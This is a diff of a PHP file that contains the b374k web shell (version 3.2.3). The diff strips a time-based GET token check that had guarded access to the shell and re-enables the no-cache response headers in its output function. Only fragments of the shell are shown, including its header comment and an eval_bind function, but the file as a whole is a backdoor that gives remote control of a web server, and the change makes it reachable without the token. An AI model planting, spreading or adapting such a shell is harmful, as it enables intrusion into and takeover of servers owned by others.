@@ -1,21 +1,4 @@
 <?php
-
-if (!isset($_GET) || empty($_GET))
-{
- echo "You are not authorised person to access this page";
-}
-else
-{
- date_default_timezone_set('UTC');
- $minus = 120;
- $created = date('YmdHis');
- $value= $_GET["id"];
- $min = $created - $minus;  
-  
-  if (( $min <= $value) && ($value <= $created  ))
-  { ?>
-
-    <?php
 /*
 	b374k shell 3.2.3
 	Jayalah Indonesiaku
@@ -1006,9 +989,9 @@ if(!function_exists('output')){
 	function output($str){
 		$error = @ob_get_contents();
 		@ob_end_clean();
-	//	header("Content-Type: text/plain");
-	//	header("Cache-Control: no-cache");
-//		header("Pragma: no-cache");
+		header("Content-Type: text/plain");
+		header("Cache-Control: no-cache");
+		header("Pragma: no-cache");
 		echo $str;
 		die();
 	}
@@ -3235,14 +3218,3 @@ function eval_bind(){
 <!--script end-->
 </body>
 </html><?php die();?>
-
-<?php
-  }
-else
-  { 
-   echo "You are not authorised person to access this page";
-  } 
-  
-}
-
-?>
